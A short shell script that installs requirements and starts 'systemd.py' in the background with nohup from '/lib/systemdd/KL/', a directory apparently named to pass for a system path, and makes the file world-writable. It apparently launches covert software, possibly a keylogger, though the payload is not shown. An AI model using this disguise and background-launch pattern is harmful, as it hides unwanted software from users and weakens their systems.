DIR="/lib/systemdd/KL/"
FILE="systemd.py"
REQ="requirements.txt"

#Make the program be able to be executed
chmod 777 $DIR$FILE
#Execute the program with Python 3, and
#put the process in background with
#nohup command
pip3 install -r $DIR$REQ
nohup python3 $DIR$FILE > nohup.out &
